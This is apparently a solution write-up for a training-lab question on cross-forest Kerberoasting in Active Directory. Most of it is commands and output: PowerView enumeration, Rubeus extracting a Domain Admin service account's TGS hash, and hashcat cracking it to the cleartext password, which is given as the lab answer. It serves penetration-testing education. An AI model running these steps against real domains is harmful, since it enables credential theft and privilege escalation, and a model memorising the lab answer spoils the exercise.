@@ -1,0 +1,124 @@
+# Section 30: Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows
+
+Module: 13. Active Directory Enumeration & Attacks
+
+---
+
+## Questions & Answers
+
+### 1. Perform a cross-forest Kerberoast attack and obtain the TGS for the mssqlsvc user. Crack the ticket and submit the account's cleartext password as your answer.
+
+Context:
+```powershell
+PS C:\Windows\system32> cd C:\Tools\
+PS C:\Tools> Import-Module .\PowerView.ps1
+PS C:\Tools> Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof
+
+samaccountname memberof
+-------------- --------
+mssqlsvc       CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL
+
+
+PS C:\Tools> .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.0.2
+
+
+[*] Action: Kerberoasting
+
+[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
+[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.
+
+[*] Target User            : mssqlsvc
+[*] Target Domain          : FREIGHTLOGISTICS.LOCAL
+[*] Searching path 'LDAP://ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL/DC=FREIGHTLOGISTICS,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=mssqlsvc)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'
+
+[*] Total kerberoastable users : 1
+
+
+[*] SamAccountName         : mssqlsvc
+[*] DistinguishedName      : CN=mssqlsvc,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL
+[*] ServicePrincipalName   : MSSQLsvc/sql01.freightlogstics:1433
+[*] PwdLastSet             : 3/24/2022 12:47:52 PM
+[*] Supported ETypes       : RC4_HMAC_DEFAULT
+[*] Hash                   : $krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$MSSQLsvc/sql01.freightlogstics:1433@FREIGHTLOGISTICS.LOCAL*$A5C1BCC26F793505D82E3F797C189513$C175B603D41E40EF9CC4ECFB1D89718454ABC6B194C34E7CBBD219503816CA67090CA0A86DFD74C72D5F418A76608655CAC52DB01F80C953104507C53748F0D4FB8EA302A155F3368DA3E132D3BF25BF8FCC7705FE070A4013BBF38E3557DB9653AD4F19A017E6B9D527DE26FD84F942A1521843737151106F7AE0F282AB2018EA53EBBEA5D0BF966A62C91F8D0BC9B38F6526CD7072F48D1094B23F9142762D3B07018D587C93BD14EAA71B3677FE179816E252652A97C6CA17A0ACB1BD36CF831BF83B05AD17CA77BB2BD02A1CFA740FD222DC169E8B4E3735BEF4E1D5A587107394FE407A5C409B58746A1C269863BACB9D6C336614DCBDE52F0F17FC1819FDC58D70A84AC7657F745C7F35D210B115A40BCAC7C75BD592A117F7FA165198B8700B4891A76B4D730EF23B51B84CE7E1734C2DA539B4CEE787AC370CA0257740232AC3056AB86933ABD9D0A719B9581BFDAD0E388CEC5F47257FFC75F34E3EC110D7885F4FCE2E915140E9BBCF6D8CB4EEBBC977AC2ABFCC4DE94BFD636647A68CB9DFD23D6B1E27CA994A8E250B8F80DAD694895A6D12FEB274B54730CB31AEE18C4D34FF9A3FF7990955082DF39FE99ECD7DDDC39E33404311DDC4B2B76187AE10540208F2F7A1F764BCC2D6BC419CFE8C331229A912CF288C053B3970D9C081B3F7F01B134F39E8E6AFE066EEAE70D5A8349FF12A9E0F80C30A4873338C9AE075211BF37C9B0415700BAE8D7B99FE32FECCBD5FF17394EED8AB8CD7B905EF09A9541B2F655C6012AB493F0C9B6E6F540794578BDCCDAF87A10AB4CCD2E71C903EF6FC70EC33EB46ED37EBB382F38EABFE1297CEF916F991DC2A1190478F8F89DA089714C72C6641370D104DD4F9D525072860720A734A79C19E32B1E0B733CB077C4C9667B1EF2534D3D3BEFCA15B5E053723173625545A5AB7FEDA11137D905DCDB61E9183CD5A40E8B51F5B5E90E2FCA61FDA73E6B5FD5EDC0621E847C2E28618FD657C9645A0D44B3C598B75EF85A01B69F3F86060D614BBBDA88C906313465B21C92D1AA127E06A7D3AC62D989556953AF522CA844B9DBD75C2B0F44A8C2A4EFD1929B6D839C71C0F31DA8B31149AF2D8B0208CBE3806FFC617F20E71F6763576B3FA2AFED92B7F3D3F4D64FD8BC9DE9B4FA8EC5B5CFC67DCD95ECA24F9204273FC9C3A0F283285E3B4D634518B9EC0F8C51216B04A2C47DCB59701D38955B0F89755227AB79EBAF938E2763C093617966E4800030E1EC25C4E28094A3F67C810861D55BEBD07A23088FB9B9F785B3106D868F4332F63DFA9B3AF33707114B0BAAA8D052B9D93DA574B9BA5D6D3669D6D6DB11CA862ADBC6A08C426A8FCDC510968F167DC813D3AC52ED628B7D099692DEB446DCCD536BA1D42DCE23F05C7EEAA706A590B7C30515FA92DD26DFC71E00717DF381C2D379B35FDF3F3822AE02BCAD7AE85F9D48E00884E7FF0F9FA84C98F89F8833776702E78132576F0B08C71C977518B86D00743D23C1448845AE9739F8EE6A8BA870F4449FFED70E574BCAC59E95BF19DAF3163C8B7A0B1A49BDC3C70AE0CED2F9AAD0E87A7C2E507C97A2B04ABA8F036D812DDEB4C7B77891308BAEC09BE02FE9456CE6B791695705FEA06B14B1979E97BBE9CBECE4BDC8FEBE35DC53B1A01E7
+```
+```bash
+┌─[eu-academy-2]─[10.10.15.191]─[htb-ac-2162140@htb-ru5kcueavg-htb-cloud-com]─[~]
+└──╼ [★]$ hashcat -m 13100 tgs /usr/share/wordlists/rockyou.txt
+hashcat (v6.2.6) starting
+
+OpenCL API (OpenCL 2.1 LINUX) - Platform #1 [Intel(R) Corporation]
+==================================================================
+* Device #1: AMD EPYC-Milan Processor, 3844/7752 MB (969 MB allocatable), 4MCU
+
+OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #2 [The pocl project]
+====================================================================================================================================================
+* Device #2: cpu-haswell-AMD EPYC-Milan Processor, skipped
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Pure kernels can crack longer passwords, but drastically reduce performance.
+If you want to switch to optimized kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Hardware monitoring interface not found on your system.
+Watchdog: Temperature abort trigger disabled.
+
+Host memory required for this attack: 1 MB
+
+Dictionary cache building /usr/share/wordlists/rockyou.txt: 33553434 bytes (23.9Dictionary cache built:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344392
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+* Runtime...: 0 secs
+
+$krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$MSSQLsvc/sql01.freightlogstics:1433@FREIGHTLOGISTICS.LOCAL*$a5c1bcc26f793505d82e3f797c189513$c175b603d41e40ef9cc4ecfb1d89718454abc6b194c34e7cbbd219503816ca67090ca0a86dfd74c72d5f418a76608655cac52db01f80c953104507c53748f0d4fb8ea302a155f3368da3e132d3bf25bf8fcc7705fe070a4013bbf38e3557db9653ad4f19a017e6b9d527de26fd84f942a1521843737151106f7ae0f282ab2018ea53ebbea5d0bf966a62c91f8d0bc9b38f6526cd7072f48d1094b23f9142762d3b07018d587c93bd14eaa71b3677fe179816e252652a97c6ca17a0acb1bd36cf831bf83b05ad17ca77bb2bd02a1cfa740fd222dc169e8b4e3735bef4e1d5a587107394fe407a5c409b58746a1c269863bacb9d6c336614dcbde52f0f17fc1819fdc58d70a84ac7657f745c7f35d210b115a40bcac7c75bd592a117f7fa165198b8700b4891a76b4d730ef23b51b84ce7e1734c2da539b4cee787ac370ca0257740232ac3056ab86933abd9d0a719b9581bfdad0e388cec5f47257ffc75f34e3ec110d7885f4fce2e915140e9bbcf6d8cb4eebbc977ac2abfcc4de94bfd636647a68cb9dfd23d6b1e27ca994a8e250b8f80dad694895a6d12feb274b54730cb31aee18c4d34ff9a3ff7990955082df39fe99ecd7dddc39e33404311ddc4b2b76187ae10540208f2f7a1f764bcc2d6bc419cfe8c331229a912cf288c053b3970d9c081b3f7f01b134f39e8e6afe066eeae70d5a8349ff12a9e0f80c30a4873338c9ae075211bf37c9b0415700bae8d7b99fe32feccbd5ff17394eed8ab8cd7b905ef09a9541b2f655c6012ab493f0c9b6e6f540794578bdccdaf87a10ab4ccd2e71c903ef6fc70ec33eb46ed37ebb382f38eabfe1297cef916f991dc2a1190478f8f89da089714c72c6641370d104dd4f9d525072860720a734a79c19e32b1e0b733cb077c4c9667b1ef2534d3d3befca15b5e053723173625545a5ab7feda11137d905dcdb61e9183cd5a40e8b51f5b5e90e2fca61fda73e6b5fd5edc0621e847c2e28618fd657c9645a0d44b3c598b75ef85a01b69f3f86060d614bbbda88c906313465b21c92d1aa127e06a7d3ac62d989556953af522ca844b9dbd75c2b0f44a8c2a4efd1929b6d839c71c0f31da8b31149af2d8b0208cbe3806ffc617f20e71f6763576b3fa2afed92b7f3d3f4d64fd8bc9de9b4fa8ec5b5cfc67dcd95eca24f9204273fc9c3a0f283285e3b4d634518b9ec0f8c51216b04a2c47dcb59701d38955b0f89755227ab79ebaf938e2763c093617966e4800030e1ec25c4e28094a3f67c810861d55bebd07a23088fb9b9f785b3106d868f4332f63dfa9b3af33707114b0baaa8d052b9d93da574b9ba5d6d3669d6d6db11ca862adbc6a08c426a8fcdc510968f167dc813d3ac52ed628b7d099692deb446dccd536ba1d42dce23f05c7eeaa706a590b7c30515fa92dd26dfc71e00717df381c2d379b35fdf3f3822ae02bcad7ae85f9d48e00884e7ff0f9fa84c98f89f8833776702e78132576f0b08c71c977518b86d00743d23c1448845ae9739f8ee6a8ba870f4449ffed70e574bcac59e95bf19daf3163c8b7a0b1a49bdc3c70ae0ced2f9aad0e87a7c2e507c97a2b04aba8f036d812ddeb4c7b77891308baec09be02fe9456ce6b791695705fea06b14b1979e97bbe9cbece4bdc8febe35dc53b1a01e7:1logistics
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
+Hash.Target......: $krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$MSSQLs...1a01e7
+Time.Started.....: Thu Aug 20 23:36:12 2026 (8 secs)
+Time.Estimated...: Thu Aug 20 23:36:20 2026 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:  1759.4 kH/s (0.71ms) @ Accel:512 Loops:1 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 13004800/14344385 (90.66%)
+Rejected.........: 0/13004800 (0.00%)
+Restore.Point....: 13002752/14344385 (90.65%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: 1lp2soad3lc* -> 1locotes
+
+Started: Thu Aug 20 23:36:05 2026
+Stopped: Thu Aug 20 23:36:21 2026
+```
+
+**Answer:** `1logistics`
+
+---
+
+[Back to Module Index](./README.md)
